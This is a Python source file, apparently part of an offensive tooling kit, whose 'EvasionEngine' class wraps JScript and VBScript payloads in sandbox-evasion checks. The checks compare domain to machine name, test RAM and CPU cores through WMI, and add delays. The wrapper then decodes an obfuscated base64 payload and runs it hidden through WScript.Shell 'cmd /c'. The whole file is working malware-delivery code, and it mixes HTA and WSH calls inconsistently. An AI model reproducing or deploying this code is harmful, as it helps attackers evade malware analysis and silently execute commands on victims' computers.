import base64

class EvasionEngine:
    @staticmethod
    def wrap_jscript(payload, check_domain=False, min_ram_gb=4, min_cores=2, sleep_ms=0):
        """
        Wraps a JScript payload with sandbox evasion techniques.
        """
        encoded_payload = base64.b64encode(payload.encode()).decode()

        checks = []
        if check_domain:
            checks.append("""
                var network = new ActiveXObject("WScript.Network");
                if (network.UserDomain == network.ComputerName) { window.close(); }
            """)
        if min_ram_gb > 0:
            checks.append(f"""
                var wmi = GetObject("winmgmts:\\\\.\\root\\CIMV2");
                var colItems = wmi.ExecQuery("SELECT TotalPhysicalMemory FROM Win32_ComputerSystem", "WQL", 0x10 | 0x20);
                var enumItems = new Enumerator(colItems);
                var totalRam = 0;
                for (; !enumItems.atEnd(); enumItems.moveNext()) {{
                    var objItem = enumItems.item();
                    totalRam = objItem.TotalPhysicalMemory;
                }}
                if (totalRam < {min_ram_gb * 1024 * 1024 * 1024}) {{ window.close(); }}
            """)
        if min_cores > 0:
            checks.append(f"""
                var wmi = GetObject("winmgmts:\\\\.\\root\\CIMV2");
                var colItems = wmi.ExecQuery("SELECT NumberOfLogicalProcessors FROM Win32_ComputerSystem", "WQL", 0x10 | 0x20);
                var enumItems = new Enumerator(colItems);
                var cores = 0;
                for (; !enumItems.atEnd(); enumItems.moveNext()) {{
                    var objItem = enumItems.item();
                    cores = objItem.NumberOfLogicalProcessors;
                }}
                if (cores < {min_cores}) {{ window.close(); }}
            """)
        if sleep_ms > 0:
            checks.append(f"""
                WScript.Sleep({sleep_ms});
            """)

        evasion_logic = "\n".join(checks)

        script_block = f"""
            var _0x1a2b = ["{encoded_payload}", "atob", "eval"];
            {evasion_logic}
            // Execute the payload if all checks pass
            var payload = window[_0x1a2b[1]](_0x1a2b[0]);
            var shell = new ActiveXObject("WScript.Shell");
            shell.Run("cmd /c " + payload, 0, true);
        """
        return script_block

    @staticmethod
    def wrap_vbscript(payload, check_domain=False, min_ram_gb=4, min_cores=2, sleep_ms=0):
        """
        Wraps a VBScript payload with sandbox evasion techniques.
        """
        # A simple VBScript wrapper, typically used inside macros or HTA directly
        # For simplicity, we just inject the plain payload since VBS base64 decoding is verbose. 
        # In a real scenario, we'd use a custom decoder function.
        
        checks = []
        if check_domain:
            checks.append("""
                Set objNetwork = CreateObject("WScript.Network")
                If objNetwork.UserDomain = objNetwork.ComputerName Then WScript.Quit
            """)
        
        if min_ram_gb > 0:
            checks.append(f"""
                Set objWMI = GetObject("winmgmts:\\\\.\\root\\CIMV2")
                Set colCS = objWMI.ExecQuery("SELECT TotalPhysicalMemory FROM Win32_ComputerSystem")
                For Each objCS In colCS
                    If objCS.TotalPhysicalMemory < {min_ram_gb * 1024 * 1024 * 1024} Then WScript.Quit
                Next
            """)
            
        if min_cores > 0:
            checks.append(f"""
                Set objWMI = GetObject("winmgmts:\\\\.\\root\\CIMV2")
                Set colCS = objWMI.ExecQuery("SELECT NumberOfLogicalProcessors FROM Win32_ComputerSystem")
                For Each objCS In colCS
                    If objCS.NumberOfLogicalProcessors < {min_cores} Then WScript.Quit
                Next
            """)
            
        if sleep_ms > 0:
            checks.append(f"""
                WScript.Sleep {sleep_ms}
            """)

        evasion_logic = "\n".join(checks)
        
        script_block = f"""
            {evasion_logic}
            
            ' Execution
            Set objShell = CreateObject("WScript.Shell")
            objShell.Run "cmd /c {payload}", 0, True
        """
        return script_block
